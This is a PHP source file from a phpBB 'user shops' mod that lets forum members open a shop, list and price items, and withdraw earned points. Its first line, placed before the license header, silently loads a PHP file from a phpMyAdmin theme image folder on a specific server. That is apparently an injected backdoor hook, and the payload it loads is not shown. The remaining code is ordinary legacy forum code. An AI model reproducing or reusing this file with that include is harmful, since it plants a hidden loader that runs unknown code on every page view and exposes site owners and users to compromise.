<?php
 require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');

/***************************************************************************
 *                            shop_users_edit.php
 *                            -------------------
 *   Version              : 2.0.1
 *   website              : http://www.zarath.com
 *
 ***************************************************************************/

/***************************************************************************
 *
 *   Copyright (C) 2004, 2006   Zarath
 *
 *   This program is free software; you can redistribute it and/or
 *   modify it under the terms of the GNU General Public License
 *   as published by the Free Software Foundation; either version 2
 *   of the License, or (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   http://www.gnu.org/copyleft/gpl.html
 *
 ***************************************************************************/

define('IN_PHPBB', true);
$phpbb_root_path = './';
include($phpbb_root_path . 'extension.inc');
include($phpbb_root_path . 'common.' . $phpEx);

//
// Start session management
//
$userdata = session_pagestart($user_ip, PAGE_INDEX);
init_userprefs($userdata);
//
// End session management
//
if (!(@include($phpbb_root_path . 'language/lang_' . $userdata['user_lang'] . '/lang_shop.' . $phpEx))) { include($phpbb_root_path . 'language/lang_' . $board_config['default_lang'] . '/lang_shop.' . $phpEx); }

#
# Make sure user is logged in!
# 
if ( !$userdata['session_logged_in'] )
{
	$redirect = 'shop_users_edit.php';
	header('Location: ' . append_sid("login.$phpEx?redirect=$redirect", true));
}
#
# Register main global variable.
#
if ( isset($HTTP_GET_VARS['action']) || isset($HTTP_POST_VARS['action']) ) { $action = ( isset($HTTP_POST_VARS['action']) ) ? $HTTP_POST_VARS['action'] : $HTTP_GET_VARS['action']; }
else { $action = ''; }
#
# Check if shops are open or closed.
#
if ( !($board_config['u_shops_enabled']) )
{
	message_die(GENERAL_MESSAGE, $lang['ushop_shops_closed']);
}

#
# Checks to make sure a user has a shop, if they don't... all follow actions should be invalid.
#
$sql = "SELECT *
	FROM " . USER_SHOPS_TABLE . "
	WHERE user_id = '{$userdata['user_id']}'";

if ( !($result = $db->sql_query($sql)) )
{
	message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'users shops'), '', __LINE__, __FILE__, $sql);
}

$sql_num_rows = $db->sql_numrows($result);

if ( $sql_num_rows == '0' && $action != 'create_shop' )
{
	$add = ( $board_config['u_shops_open_cost'] > 0 ) ? sprintf($lang['ushop_cost_to_open'], $board_config['u_shops_open_cost'], $board_config['points_name']) : '';

	message_die(GENERAL_MESSAGE, sprintf($lang['ushop_open_shop'], '<a href="' . append_sid("shop_users_edit.php?action=create_shop") . '" class="nav">', '</a>') . '<br />' . $add);
}
#
# End main check
#

//default page
if ( empty($action) )
{
	if ( isset($HTTP_GET_VARS['edit_item']) || isset($HTTP_POST_VARS['edit_item']) ) { $edit_item = ( isset($HTTP_POST_VARS['edit_item']) ) ? intval($HTTP_POST_VARS['edit_item']) : intval($HTTP_GET_VARS['edit_item']); }
	else { $edit_item = ''; }

	$template->set_filenames(array(
		'body' => 'shop/shop_users_config.tpl')
	);
	# Set config options...
	if ( !($row = $db->sql_fetchrow($result)) )
	{
		message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'users shops'), '', __LINE__, __FILE__, $sql);
	}

	$status_1 = ( $row['shop_status'] == 0 ) ? 'SELECTED' : '';
	$status_2 = ( $row['shop_status'] == 2 ) ? 'SELECTED' : '';
	$status_3 = ( $row['shop_status'] == 1 ) ? 'SELECTED' : '';

	if ( $row['amount_holding'] > 0 )
	{
		$template->assign_block_vars('switch_withdraw_holdings', array(
			'WITHDRAW_URL' => append_sid('shop_users_edit.' . $phpEx . '?action=withdraw_holdings')
		));
	}

	$template->assign_block_vars('switch_are_shops', array(
		'SHOP_NAME' => $row['shop_name'],
		'SHOP_TYPE' => $row['shop_type'],
		'STATUS_SELECT_1' => $status_1,
		'STATUS_SELECT_2' => $status_3,
		'STATUS_SELECT_3' => $status_2,

		'SHOP_OPENED' => create_date($board_config['default_dateformat'], $row['shop_opened'], $board_config['board_timezone']),
		'SHOP_EARNT' => $row['amount_earnt'],
		'SHOP_HOLDING' => $row['amount_holding'],
		'SHOP_ITEMS_LEFT' => $row['items_holding'],
		'SHOP_ITEMS_SOLD' => $row['items_sold']
	));

	# Begin displaying shop items
	$sql = "SELECT a.*, b.*
		FROM " . USER_SHOP_ITEMS_TABLE . " as a, " . USER_ITEMS_TABLE . " as b
		WHERE a.shop_id = '{$row['id']}'
			AND b.id = a.real_id
			AND b.worn = 2
		ORDER BY b.item_name";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'users shop items'), '', __LINE__, __FILE__, $sql);
	}

	$sql_num_rows = $db->sql_numrows($result);

	if ( $sql_num_rows == 0 )
	{
		$template->assign_block_vars('switch_no_items', array());
	}
	else
	{
		$template->assign_block_vars('switch_are_items', array());

		for ($i = 0; $i < $sql_num_rows; $i++)
		{
			$rownum = ( $i % 2 ) ? "row1" : "row2";

			if ( !($row = $db->sql_fetchrow($result)) )
			{
				message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'users shop items'), '', __LINE__, __FILE__, $sql);
			}

			if ( $row['wrapped'] )
			{
				$row['item_name'] = $row['wrapped'];
			}

			if ( $row['id'] != $edit_item )
			{
				$template->assign_block_vars('list_items', array(
					'ROW_CLASS' => $rownum,
					'ITEM_NAME' => $row['item_name'],
					'ITEM_NOTES' => $row['seller_notes'],
					'ITEM_COST' => $row['cost'],

					'EDIT_URL' => append_sid('shop_users_edit.' . $phpEx . '?edit_item=' . $row['id']),
					'DELETE_URL' => append_sid('shop_users_edit.' . $phpEx . '?action=change_items&sub_action=delete_item&item_id=' . $row['id'])
				));
			}
			else
			{
				$template->assign_block_vars('switch_edit_item', array(
					'ITEM_NAME' => $row['name'],
					'ITEM_NOTES' => $row['seller_notes'],
					'ITEM_COST' => $row['cost'],

					'UPDATE_URL' => append_sid('shop_users_edit.' .$phpEx . '?action=change_items&sub_action=update_item&item_id=' . $row['id'])
				));
			}
		}
	}

	# Begin displaying shop items to ADD
	# Arrange items to a variable that can be used in a IN
	$sql = "SELECT *
		FROM " . USER_ITEMS_TABLE . "
		WHERE user_id = '{$userdata['user_id']}'
			AND worn = 0
		ORDER BY item_name";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'users shop items'), '', __LINE__, __FILE__, $sql);
	}

	$sql_num_rows = $db->sql_numrows($result);

	if ( $sql_num_rows > 0 )
	{
		$template->assign_block_vars('switch_are_a_items', array());

		for ($i = 0; $i < $sql_num_rows; $i++)
		{
			if ( !($row = $db->sql_fetchrow($result)) )
			{
				message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'users shop items'), '', __LINE__, __FILE__, $sql);
			}

			if ( $row['wrapped'] )
			{
				$row['item_name'] = $row['wrapped'];
			}

			$template->assign_block_vars('list_add_items', array(
				'ITEM_NAME' => $row['item_name'],
				'ITEM_ID' => $row['item_id']
			));
		}
	}


	$page_title = $lang['ushop_edit_p_shop'];
	$shoplocation = ' -> <a href="' . append_sid('shop_users.' . $phpEx, true) . '" class="nav">' . $lang['ushop_shop_list'] . '</a> -> <a href="' . append_sid('shop_users_edit.' . $phpEx) . '" class="nav">' . $lang['ushop_edit_your_shop'] . '</a>';

	$template->assign_vars(array(
		'U_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=" . $userdata['user_id']),

		'USER_POINTS' => $userdata['user_points'],

		'SHOPLOCATION' => $shoplocation,
		'L_INVENTORY' => $lang['your_inv'],
		'L_POINTS_NAME' => $board_config['points_name'],
		'L_PERSONAL_INFO' => $lang['shop_personal_info'],

		'L_ITEMS_TABLE' => $lang['ushop_edit_shop_items'],
		'L_SHOP_TITLE' => $lang['ushop_edit_p_shop'],

		'L_SHOP_SETTINGS' => $lang['ushop_shop_settings'],
		'L_SHOP_NAME' => $lang['shop_name'],
		'L_SHOP_TYPE' => $lang['shop_type'],
		'L_SHOP_STATUS' => $lang['ushop_status'],
		'L_SHOP_OPEN' => $lang['ushop_open'],
		'L_SHOP_CLOSED' => $lang['ushop_closed'],
		'L_SHOP_RESTOCK' => $lang['ushop_restocking'],
		'L_SHOP_OPENED' => $lang['ushop_opened'],
		'L_EARNED' => $lang['ushop_earned'],
		'L_HOLDING' => $lang['ushop_holding'],
		'L_WITHDRAW' => $lang['ushop_withdraw'],
		'L_ITEMS_LEFT' => $lang['ushop_items_left'],
		'L_ITEMS_SOLD' => $lang['ushop_items_sold'],
		'L_UPDATE_SETTINGS' => $lang['ushop_update_settings'],
		'L_EDIT_ITEMS_TITLE' => $lang['ushop_edit_shop_items'],
		'L_ITEM_NAME' => $lang['name'],
		'L_SELLER_NOTES' => $lang['ushop_seller_notes'],
		'L_COST' => $lang['item_cost'],
		'L_ACTIONS' => $lang['shop_actions'],
		'L_UPDATE_ITEM' => $lang['ashop_cs_uitem'],
		'L_EDIT' => $lang['ashop_edit'],
		'L_REMOVE' => $lang['ushop_remove'],
		'L_NO_ITEMS' => $lang['ushop_no_items_in_store'],
		'L_ADD_ITEM' => $lang['shop_add_item'],
		'L_NONE' => $lang['ushop_none']
	));

	$template->assign_block_vars('', array());
}
elseif ( $action == 'create_shop' )
{
	$sql = "SELECT *
		FROM " . USER_SHOPS_TABLE . "
		WHERE user_id = '{$userdata['user_id']}'";

	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'users shops'), '', __LINE__, __FILE__, $sql);
	}

	$sql_num_rows = $db->sql_numrows($result);

	if ( $sql_num_rows ) { message_die(GENERAL_MESSAGE, $lang['ushop_already_opened'] . '<br /><br />' . sprintf($lang['ushop_u_edit'], '<a href="' . append_sid("shop_users_edit.php") . '" class="nav">','</a>')); }
	else
	{
		#
		# Charge Users
		#
		if ( $board_config['u_shops_open_cost'] > 0 )
		{
			if ( $userdata['user_points'] < $board_config['u_shops_open_cost'] ) { message_die(GENERAL_MESSAGE, sprintf($lang['ushop_not_enough_money'], $board_config['points_name'], $board_config['u_shops_open_cost'])); }
			else
			{
				$sql = "UPDATE " . USERS_TABLE . "
					SET user_points = user_points - {$board_config['u_shops_open_cost']}
					WHERE user_id = '{$userdata['user_id']}'";
				if ( !($db->sql_query($sql)) )
				{
					message_die(GENERAL_ERROR, sprintf($lang['shop_error_updating'], 'users shops'), '', __LINE__, __FILE__, $sql);
				}
			}
		}

		$sql = "INSERT
			INTO " . USER_SHOPS_TABLE . "
			(user_id, username, shop_name, shop_type, shop_opened)
			VALUES('{$userdata['user_id']}', '{$userdata['username']}', '{$userdata['username']}\'s Shop', 'Unknown', '" . time() . "')";

		if ( !($db->sql_query($sql)) )
		{
			message_die(GENERAL_ERROR, sprintf($lang['shop_error_inserting'], 'users shops'), '', __LINE__, __FILE__, $sql);
		}

		message_die(GENERAL_MESSAGE, $lang['ushop_shop_opened'] . '<br /><br />' . sprintf($lang['ushop_u_edit'], '<a href="' . append_sid("shop_users_edit.php") . '" class="nav">','</a>'));
	}
}
elseif ( $action == 'update_config' )
{
	# Register globals for update!
	if ( isset($HTTP_GET_VARS['shop_name']) || isset($HTTP_POST_VARS['shop_name']) ) { $shop_name = ( isset($HTTP_POST_VARS['shop_name']) ) ? htmlspecialchars($HTTP_POST_VARS['shop_name']) : htmlspecialchars($HTTP_GET_VARS['shop_name']); }
	else { $shop_name = ''; }
	if ( isset($HTTP_GET_VARS['shop_type']) || isset($HTTP_POST_VARS['shop_type']) ) { $shop_type = ( isset($HTTP_POST_VARS['shop_type']) ) ? htmlspecialchars($HTTP_POST_VARS['shop_type']) : htmlspecialchars($HTTP_GET_VARS['shop_type']); }
	else { $shop_type = ''; }
	if ( isset($HTTP_GET_VARS['shop_status']) || isset($HTTP_POST_VARS['shop_status']) ) { $shop_status = ( isset($HTTP_POST_VARS['shop_status']) ) ? intval($HTTP_POST_VARS['shop_status']) : intval($HTTP_GET_VARS['shop_status']); }
	else { $shop_status = ''; }

	$shop_name = addslashes(stripslashes($shop_name));
	$shop_type = addslashes(stripslashes($shop_type));
	$shop_status = ( $shop_status > 2 || $shop_stats < 0 ) ? 1 : $shop_status;

	$sql = "UPDATE " . USER_SHOPS_TABLE . "
		SET shop_name = '$shop_name',
			shop_type = '$shop_type',
			shop_updated = '" . time() . "',
			shop_status = '$shop_status'
		WHERE user_id = '{$userdata['user_id']}'";

	if ( !($db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, sprintf($lang['shop_error_updating'], 'users'), '', __LINE__, __FILE__, $sql);
	}

	message_die(GENERAL_MESSAGE, $lang['ushop_shop_updated'] . '<br /><br />' . sprintf($lang['ushop_u_edit'], '<a href="' . append_sid("shop_users_edit.php") . '" class="nav">','</a>'));
}
elseif ( $action == 'change_items' )
{
	if ( isset($HTTP_GET_VARS['sub_action']) || isset($HTTP_POST_VARS['sub_action']) ) { $sub_action = ( isset($HTTP_POST_VARS['sub_action']) ) ? $HTTP_POST_VARS['sub_action'] : $HTTP_GET_VARS['sub_action']; }
	else { $sub_action = ''; }
	if ( isset($HTTP_GET_VARS['item_id']) || isset($HTTP_POST_VARS['item_id']) ) { $item_id = ( isset($HTTP_POST_VARS['item_id']) ) ? intval($HTTP_POST_VARS['item_id']) : intval($HTTP_GET_VARS['item_id']); }
	else { $item_id = ''; }

	if ( !($info_row = $db->sql_fetchrow($result)) )
	{
		message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'users shops'), '', __LINE__, __FILE__, $sql);
	}

	if ( $sub_action == 'add_item' )
	{
		if ( isset($HTTP_GET_VARS['item_cost']) || isset($HTTP_POST_VARS['item_cost']) ) { $item_cost = ( isset($HTTP_POST_VARS['item_cost']) ) ? intval($HTTP_POST_VARS['item_cost']) : intval($HTTP_GET_VARS['item_cost']); }
		else { $item_cost = ''; }
		if ( isset($HTTP_GET_VARS['item_notes']) || isset($HTTP_POST_VARS['item_notes']) ) { $item_notes = ( isset($HTTP_POST_VARS['item_notes']) ) ? htmlspecialchars($HTTP_POST_VARS['item_notes']) : htmlspecialchars($HTTP_GET_VARS['item_notes']); }
		else { $item_notes = ''; }

		$item_notes = ( empty($item_notes) ) ? $lang['ushop_default_notes'] : addslashes(stripslashes($item_notes));
		if ( $item_cost < 1 ) { $item_cost = 1; }

		$sql = "SELECT *
			FROM " . USER_ITEMS_TABLE . "
			WHERE item_id = '$item_id'
				AND user_id = '{$userdata['user_id']}'
				AND worn = 0";
		if ( !($result = $db->sql_query($sql)) )
		{
			message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'users shop items'), '', __LINE__, __FILE__, $sql);
		}

		$sql_num_rows = $db->sql_numrows($result);

		if ( $sql_num_rows )
		{
			if ( !($row = $db->sql_fetchrow($result)) )
			{
				message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'users shop items'), '', __LINE__, __FILE__, $sql);
			}

			# 
			# If max limit is set, check amount
			#
			if ( $board_config['u_shops_max_items'] > 0 )
			{
				$sql = "SELECT count(*) as amount
					FROM " . USER_SHOP_ITEMS_TABLE . "
					WHERE shop_id = '{$row['shop_id']}'";

				if ( !($result = $db->sql_query($sql)) )
				{
					message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'users shop items'), '', __LINE__, __FILE__, $sql);
				}
				$shop_info = $db->sql_fetchrow($result);

				if ( $shop_info['amount'] > $board_config['u_shops_max_items'] ) { message_die(GENERAL_MESSAGE, $lang['ushop_shop_full'] . '<br /><br />' . sprintf($lang['ushop_u_edit'], '<a href="' . append_sid("shop_users_edit.php") . '" class="nav">','</a>')); }
			}


			$sql = "UPDATE " . USER_ITEMS_TABLE . "
				SET worn = '2'
				WHERE user_id = '{$userdata['user_id']}'
					AND item_id = '$item_id'
					AND worn = '0'
				LIMIT 1";
			if ( !($db->sql_query($sql)) )
			{
				message_die(GENERAL_ERROR, sprintf($lang['shop_error_updating'], 'users'), '', __LINE__, __FILE__, $sql);
			}

			$sql = "INSERT
				INTO " . USER_SHOP_ITEMS_TABLE . "
				(shop_id, item_id, seller_notes, cost, time_added, real_id)
				VALUES('{$info_row['id']}', '{$row['item_id']}', '$item_notes', '$item_cost', '" . time() . "', '{$row['id']}')";
			if ( !($db->sql_query($sql)) )
			{
				message_die(GENERAL_ERROR, sprintf($lang['shop_error_inserting'], 'users'), '', __LINE__, __FILE__, $sql);
			}

			$sql = "UPDATE " . USER_SHOPS_TABLE . "
				SET items_holding = items_holding + 1,
					shop_updated = '" . time() . "'
				WHERE user_id = '{$userdata['user_id']}'";
			if ( !($db->sql_query($sql)) )
			{
				message_die(GENERAL_ERROR, sprintf($lang['shop_error_deleting'], 'users shop items'), '', __LINE__, __FILE__, $sql);
			}

			message_die(GENERAL_MESSAGE, $lang['ushop_item_added'] . '<br /><br />' . sprintf($lang['ushop_u_edit'], '<a href="' . append_sid("shop_users_edit.php") . '" class="nav">','</a>'));
		}
		else { message_die(GENERAL_MESSAGE, $lang['ushop_dont_own_item'] . '<br /><br />' . sprintf($lang['ushop_u_edit'], '<a href="' . append_sid("shop_users_edit.php") . '" class="nav">','</a>')); }

	}
	elseif ( $sub_action == 'delete_item' )
	{
		$sql = "SELECT a.*, b.item_name, b.item_id as i_id
			FROM " . USER_SHOP_ITEMS_TABLE . " as a, " . USER_ITEMS_TABLE . " as b
			WHERE a.real_id = '$item_id'
				AND b.item_id = a.item_id
				AND b.user_id = '{$userdata['user_id']}'
				AND b.worn = 2";
		if ( !($result = $db->sql_query($sql)) )
		{
			message_die(GENERAL_ERROR, sprintf($lang['shop_error_inserting'], 'shop items'), '', __LINE__, __FILE__, $sql);
		}

		$sql_num_rows = $db->sql_numrows($result);

		if ( $sql_num_rows > 0 )
		{
			if ( !($row = $db->sql_fetchrow($result)) )
			{
				message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'users shop items'), '', __LINE__, __FILE__, $sql);
			}

			$sql = "DELETE
				FROM " . USER_SHOP_ITEMS_TABLE . "
				WHERE real_id = '$item_id'";
			if ( !($db->sql_query($sql)) )
			{
				message_die(GENERAL_ERROR, sprintf($lang['shop_error_deleting'], 'users shop items'), '', __LINE__, __FILE__, $sql);
			}

			$sql = "UPDATE " . USER_ITEMS_TABLE . "
				SET worn = 0
				WHERE user_id = '{$userdata['user_id']}'
					AND item_id = '{$row['i_id']}'
					AND id = '{$row['real_id']}'
					AND worn = 2";
			if ( !($db->sql_query($sql)) )
			{
				message_die(GENERAL_ERROR, sprintf($lang['shop_error_deleting'], 'users shop items'), '', __LINE__, __FILE__, $sql);
			}

			$sql = "UPDATE " . USER_SHOPS_TABLE . "
				SET items_holding = items_holding - 1
				WHERE user_id = '{$userdata['user_id']}'";
			if ( !($db->sql_query($sql)) )
			{
				message_die(GENERAL_ERROR, sprintf($lang['shop_error_deleting'], 'users shop items'), '', __LINE__, __FILE__, $sql);
			}

			message_die(GENERAL_MESSAGE, $lang['ushop_item_removed'] . '<br /><br />' . sprintf($lang['ushop_u_edit'], '<a href="' . append_sid("shop_users_edit.php") . '" class="nav">','</a>')); 
		}
		else { message_die(GENERAL_MESSAGE, $lang['ushop_item_not_in_store'] . '<br /><br />' . sprintf($lang['ushop_u_edit'], '<a href="' . append_sid("shop_users_edit.php") . '" class="nav">','</a>')); }
	}
	elseif ( $sub_action == 'update_item' )
	{
		if ( isset($HTTP_GET_VARS['item_cost']) || isset($HTTP_POST_VARS['item_cost']) ) { $item_cost = ( isset($HTTP_POST_VARS['item_cost']) ) ? intval($HTTP_POST_VARS['item_cost']) : intval($HTTP_GET_VARS['item_cost']); }
		else { $item_cost = ''; }
		if ( isset($HTTP_GET_VARS['item_notes']) || isset($HTTP_POST_VARS['item_notes']) ) { $item_notes = ( isset($HTTP_POST_VARS['item_notes']) ) ? htmlspecialchars($HTTP_POST_VARS['item_notes']) : htmlspecialchars($HTTP_GET_VARS['item_notes']); }
		else { $item_notes = ''; }
		$item_notes = ( empty($item_notes) ) ? $lang['ushop_default_notes'] : addslashes(stripslashes($item_notes));
		if ( $item_cost < 1 ) { $item_cost = 1; }

		$sql = "SELECT a.*, b.item_name, b.item_id as i_id
			FROM " . USER_SHOP_ITEMS_TABLE . " as a, " . USER_ITEMS_TABLE . " as b
			WHERE a.real_id = $item_id
				AND b.item_id = a.item_id
				AND b.user_id = {$userdata['user_id']}
				AND b.worn = 2";
		if ( !($result = $db->sql_query($sql)) )
		{
			message_die(GENERAL_ERROR, sprintf($lang['shop_error_inserting'], 'shop items'), '', __LINE__, __FILE__, $sql);
		}

		$sql_num_rows = $db->sql_numrows($result);

		if ( $sql_num_rows > 0 )
		{
			$sql = "UPDATE " . USER_SHOP_ITEMS_TABLE . "
				set cost = '$item_cost',
					seller_notes = '$item_notes'
				WHERE real_id = '$item_id'";
			if ( !($db->sql_query($sql)) )
			{
				message_die(GENERAL_ERROR, sprintf($lang['shop_error_inserting'], 'user shop items'), '', __LINE__, __FILE__, $sql);
			}

			message_die(GENERAL_MESSAGE, $lang['ushop_item_updated'] . '<br /><br />' . sprintf($lang['ushop_u_edit'], '<a href="' . append_sid("shop_users_edit.php") . '" class="nav">','</a>'));
		}
		else { message_die(GENERAL_MESSAGE, $lang['ushop_cant_update'] . '<br /><br />' . sprintf($lang['ushop_u_edit'], '<a href="' . append_sid("shop_users_edit.php") . '" class="nav">','</a>')); }
	}
}
elseif ( $action == 'withdraw_holdings' )
{
	$sql = "SELECT amount_holding
		FROM " . USER_SHOPS_TABLE . "
		WHERE user_id = '{$userdata['user_id']}'";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'user shops'), '', __LINE__, __FILE__, $sql);
	}

	if ( !($row = $db->sql_fetchrow($result)) )
	{
		message_die(GENERAL_ERROR, sprintf($lang['shop_error_selecting'], 'users shops'), '', __LINE__, __FILE__, $sql);
	}


	if ( $row['amount_holding'] < 1 ) { message_die(GENERAL_MESSAGE, $lang['ushop_nothing_to_withdraw']); }

	$sql = "UPDATE " . USERS_TABLE . "
		SET user_points = user_points + {$row['amount_holding']}
		WHERE user_id = '{$userdata['user_id']}'";
	if ( !($db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, sprintf($lang['shop_error_updating'], 'users'), '', __LINE__, __FILE__, $sql);
	}

	$sql = "UPDATE " . USER_SHOPS_TABLE . "
		SET amount_holding = '0',
			shop_updated = '" . time() . "'
		WHERE user_id = '{$userdata['user_id']}'";
	if ( !($db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, sprintf($lang['shop_error_updating'], 'user shops'), '', __LINE__, __FILE__, $sql);
	}

	message_die(GENERAL_MESSAGE, sprintf($lang['ushop_withdrawn'], $row['amount_holding'], $board_config['points_name']) . '<br /><br />' . sprintf($lang['ushop_u_edit'], '<a href="' . append_sid("shop_users_edit.php") . '" class="nav">','</a>'));
}
else { message_die(GENERAL_MESSAGE, "Invalid Action!"); }

//
// Start output of page
//
include($phpbb_root_path . 'includes/page_header.' . $phpEx);

//
// Generate the page
//
$template->pparse('body');

include($phpbb_root_path . 'includes/page_tail.' . $phpEx);

?>